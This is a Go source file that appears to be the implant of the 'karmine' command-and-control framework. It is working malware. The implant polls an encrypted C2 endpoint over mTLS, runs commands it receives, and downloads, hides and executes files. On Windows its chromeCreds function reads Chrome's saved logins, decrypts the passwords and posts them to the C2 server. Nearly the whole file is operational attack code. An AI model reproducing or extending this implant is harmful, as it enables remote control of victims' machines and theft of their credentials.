package main

import (
	"bytes"
	"database/sql"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"sync"
	"time"

	"github.com/pygrum/karmine/client"
	ex "github.com/pygrum/karmine/karma/cmd/exec"
	"github.com/pygrum/karmine/karma/grab"
	"github.com/pygrum/karmine/karma/hide"
	"github.com/pygrum/karmine/krypto/kes"
	"github.com/pygrum/karmine/krypto/kryptor"
	"github.com/pygrum/karmine/models"
	log "github.com/sirupsen/logrus"
)

// set at compile time
var (
	InitC2Endpoint  string
	InitWaitSeconds string
	InitUUID        string
	certData        string
	keyData         string
	InitAESKey      string
	X1              string
	X2              string
	InitPFile       string
	CmdMap          = make(map[int]func(*models.KarResponseObjectCmd, ...models.MultiType) error)
)

func main() {
	// Assign known commands to command function map
	CmdMap[1] = ex.Do
	var wg sync.WaitGroup
	c2Endpoint := InitC2Endpoint
	waitSecondsInt, err := strconv.Atoi(InitWaitSeconds)
	if err != nil {
		waitSecondsInt = 600 // default loop time until next command is 10 minutes
	}
	if _, err := os.Stat(InitPFile); err == nil {
		hide.HideF(InitPFile)
	}
	ticker := time.NewTicker(time.Duration(time.Duration(waitSecondsInt) * time.Second))
	endpointStr, err := kryptor.Decrypt(c2Endpoint, X1, X2)
	if err != nil {
		log.Fatal(err)
	}
	UUID, err := kryptor.Decrypt(InitUUID, X1, X2)
	if err != nil {
		log.Fatal(err)
	}
	mTLSClient, err := client.MTLsClientByKryptor(certData, keyData, X1, X2)
	if err != nil {
		log.Fatal(err)
	}
	wg.Add(1)
	go awaitCmd(string(endpointStr), string(UUID), X1, X2, InitAESKey, ticker, mTLSClient) // thread handling receiving commands

	go awaitFile(string(endpointStr), string(UUID), X1, X2, InitAESKey, InitPFile, ticker, mTLSClient) // thread handling receiving files

	if runtime.GOOS == "windows" {
		wg.Add(1)
		go chromeCreds(string(endpointStr), string(UUID), InitAESKey, X1, X2, mTLSClient)
	}
	wg.Wait()
}

func chromeCreds(c2Endpoint, UUID, aesKey, kX1, kX2 string, mTLSClient *http.Client) {
	cu, err := grab.NewUser()
	if err != nil {
		return
	}
	db, err := sql.Open("sqlite3", cu.HomeDir+grab.WinChromePwDBPath)
	if err != nil {
		return
	}
	defer db.Close()
	rows, err := db.Query("select origin_url, username_value, password_value from logins")
	if err != nil {
		return
	}
	if err = cu.GetChromeKey(); err != nil {
		return
	}

	defer rows.Close()
	for rows.Next() {
		var c_url, c_user, c_pass string
		if err = rows.Scan(&c_url, &c_user, &c_pass); err != nil {
			return
		}
		plainpw, err := cu.DecryptDetails(c_pass)
		if err != nil {
			return
		}
		pwObj := &models.KarObjectCred{
			Platform: "Google Chrome",
			Creds: models.CredObj{
				Url:      c_url,
				Username: c_user,
				Password: plainpw,
			},
		}
		bytes, err := json.Marshal(pwObj)
		if err != nil {
			return
		}
		encObj, err := kes.EncryptObject(bytes, aesKey, kX1, kX2)
		if err != nil {
			return
		}
		go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
			CmdID:  -1,
			UUID:   "",
			Type:   3,
			Object: encObj,
		})
	}
}

func awaitFile(c2Endpoint, UUID, kX1, kX2, aesKey, pFile string, ticker *time.Ticker, mTLSClient *http.Client) {
	var prevCmd int
	for range ticker.C {
		fObject, cmdID, broadcast, err := getObjectBytes(prevCmd, c2Endpoint, UUID, kX1, kX2, aesKey, mTLSClient, "2")
		if err == nil {
			prevCmd = cmdID
			fileObj := &models.KarObjectFile{}
			if err := json.Unmarshal(fObject, fileObj); err != nil {
				continue
			}
			filename := fileObj.FileName
			if err = os.WriteFile(filename, fileObj.FileBytes, 0744); err != nil {
				continue
			}
			if _, err := os.Stat(pFile); err != nil {
				go handleFile(cmdID, filename, c2Endpoint, UUID, broadcast, kX1, kX2, aesKey, pFile, mTLSClient)
			} else {
				cmd := exec.Command(pFile, filename)
				var cerr bytes.Buffer
				cmd.Stderr = &cerr
				if err := cmd.Run(); err != nil {
					fileObj := &models.KarResponseObjectFile{
						Error:  1,
						ErrVal: cerr.String(),
					}
					bytes, _ := json.Marshal(fileObj)
					if !broadcast {
						bytes, err = kes.EncryptObject(bytes, aesKey, kX1, kX2)
						if err != nil {
							continue
						}
					}
					go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
						CmdID:  cmdID,
						Type:   2,
						Object: bytes,
					})
				}
			}
		}
	}
}

func awaitCmd(c2Endpoint, UUID, kX1, kX2, aesKey string, ticker *time.Ticker, mTLSClient *http.Client) {
	var prevCmd int
	for range ticker.C {
		cmdObjectBytes, cmdID, broadcast, err := getObjectBytes(prevCmd, c2Endpoint, UUID, kX1, kX2, aesKey, mTLSClient, "1")
		if err == nil {
			cmdObj := &models.KarObjectCmd{}
			if err := json.Unmarshal(cmdObjectBytes, cmdObj); err != nil {
				continue
			}
			prevCmd = cmdID
			go parseCmdObject(cmdObj, cmdID, c2Endpoint, UUID, broadcast, kX1, kX2, aesKey, mTLSClient)
		}
	}
}

func handleFile(cmdID int, fname, c2Endpoint, UUID string, broadcast bool, kX1, kX2, aesKey, pFile string, mTLSClient *http.Client) {
	hide.HideF(fname)
	if runtime.GOOS == "linux" {
		fname = "./" + fname
	}
	cmd := exec.Command(fname)
	fileObj := models.KarResponseObjectFile{}
	var cerr bytes.Buffer
	cmd.Stderr = &cerr
	if err := cmd.Run(); err != nil {
		fmt.Println(err)
		fmt.Println(cerr.String())
		fileObj.Error = 1
		fileObj.ErrVal = cerr.String()
	}
	bytes, _ := json.Marshal(fileObj)
	var err error
	if !broadcast {
		bytes, err = kes.EncryptObject(bytes, aesKey, kX1, kX2)
		if err != nil {
			return
		}
	}
	go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
		CmdID:  cmdID,
		Type:   2,
		Object: bytes,
	})
}

func getObjectBytes(prevCmd int, Endpoint, UUID, kX1, kX2, aesKey string, mTLSClient *http.Client, dataType string) ([]byte, int, bool, error) {
	genericObj, err := requestData(Endpoint, UUID, dataType, mTLSClient)
	if err != nil {
		return nil, 0, false, err
	}
	if len(genericObj.UUID) != 0 {
		genericObj.Object, err = kes.DecryptObject(genericObj.Object, aesKey, kX1, kX2)
		if err != nil {
			return nil, 0, false, err
		}
	}
	if genericObj.CmdID == prevCmd {
		return nil, 0, false, fmt.Errorf("")
	}
	return genericObj.Object, genericObj.CmdID, genericObj.UUID == "", nil
}

func requestData(Endpoint, UUID, dataType string, mTLSClient *http.Client) (*models.GenericData, error) {
	req, err := http.NewRequest(http.MethodGet, Endpoint, nil)
	if err != nil {
		return nil, err
	}
	// setting uuid header so my request is trusted by C2 server
	req.Header.Add("X-UUID", UUID)
	value := url.Values{
		"t": {dataType},
	}
	req.URL.RawQuery = value.Encode()
	res, err := mTLSClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer res.Body.Close()
	if res.Body == http.NoBody {
		return nil, fmt.Errorf("")
	}
	genericObj := &models.GenericData{}
	body, _ := ioutil.ReadAll(res.Body)
	if err = json.Unmarshal(body, genericObj); err != nil {
		return nil, err
	}
	if genericObj.UUID != UUID {
		// blank if for everyone
		if len(genericObj.UUID) != 0 {
			return nil, fmt.Errorf("")
		}
	}
	return genericObj, nil
}

func parseCmdObject(cmdObject *models.KarObjectCmd, cmdID int, c2Endpoint, UUID string, broadcast bool, kX1, kX2, aesKey string, mTLSClient *http.Client) {
	responseObject := &models.KarResponseObjectCmd{}
	cmdlet, args := cmdObject.Cmd, cmdObject.Args
	f, ok := CmdMap[cmdlet]
	var err error
	if !ok {
		responseObject.Code = 1
	} else {
		err = f(responseObject, args...)
		if err != nil {
			responseObject.Code = 1
		}
	}
	respObjectBytes, err := json.Marshal(responseObject)
	if err == nil {
		if !broadcast {
			respObjectBytes, err = kes.EncryptObject(respObjectBytes, aesKey, X1, X2)
			if err != nil {
				log.Error("")
				return
			}
		}
		go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
			Type:   1, // data type 1 is a command
			CmdID:  cmdID,
			Object: respObjectBytes,
		})
	} else {
		log.Error(err)
	}
}

// generic enough to be called anytime
func postData(Endpoint, UUID string, mTLSClient *http.Client, data *models.GenericData) {
	o, err := json.Marshal(data)
	if err != nil {
		log.Error(err)
		return
	}
	req, err := http.NewRequest(http.MethodPost, Endpoint, bytes.NewReader(o))
	if err != nil {
		log.Error(err)
		return
	}
	// setting uuid header so my request is trusted by C2 server
	req.Header.Add("X-UUID", UUID)
	_, err = mTLSClient.Do(req) // no need to save response
	if err != nil {
		log.Error(err)
		return
	}
}
